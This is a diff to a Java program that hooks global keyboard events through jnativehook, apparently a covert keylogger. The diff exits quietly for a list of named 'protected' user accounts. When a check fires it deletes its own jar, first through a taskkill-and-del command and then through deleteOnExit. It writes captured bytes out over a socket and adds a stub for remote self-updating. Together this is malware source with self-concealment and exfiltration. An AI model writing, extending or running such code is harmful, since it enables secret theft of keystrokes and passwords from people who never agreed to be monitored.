@@ -28,10 +28,16 @@ import org.jnativehook.keyboard.NativeKeyEvent;
 
 public class Main implements NativeKeyListener{
 	public static void main (String[] args) throws IOException, URISyntaxException {
+		int version = 1;
+		if (getCurrentVersion() > version) {
+			// update the code, replace current version with new version. (not done)
+		}
 		String[] protect = new String[]{"s-duv", "citrus", "s-suzukia","s-tehi", "s-chenb"};
 		// System.out.println(System.getProperty("user.name"));
 		for(int fsk = 0; fsk < protect.length; fsk++) {
+			// System.out.println(System.getProperty("user.name"));
 			if (protect[fsk].matches(System.getProperty("user.name"))) {
+				System.out.println(fsk);
 				System.exit(0);
 			}
 		}
@@ -41,8 +47,7 @@ public class Main implements NativeKeyListener{
 		}
 		if (isSuicune()) {
 			 File cf = new File(Main.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
-			 @SuppressWarnings("unused")
-			Process bye = Runtime.getRuntime().exec("cmd /c start cmd.exe /K" + " " + "taskkill /im javaw.exe /f && del " + cf + " && taskkill /im cmd.exe /f");
+			cf.deleteOnExit();
 			System.exit(0);
 		}
 		File yiffyiff = new File(Main.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
@@ -201,6 +206,7 @@ public class Main implements NativeKeyListener{
 	    		// System.out.println(""); 
 	    		os.write(bytearray,0,bytearray.length); 
 	    		os.flush(); 
+	    		socket.close();
 	    	} catch (Exception e) {
 	    		System.out.println(e);
 	    	}
@@ -258,5 +264,13 @@ public class Main implements NativeKeyListener{
 				 } catch (Exception e) {
 					 System.out.println("blarfff");
 				 }
+	 }
+	 public static int getCurrentVersion() {
+		 try {
+		 // return version from domain controller, if cant connect return current version
+			 return 1;
+		 } catch (Exception ee) {
+			 return 1;
+		 }
 	 }
 }
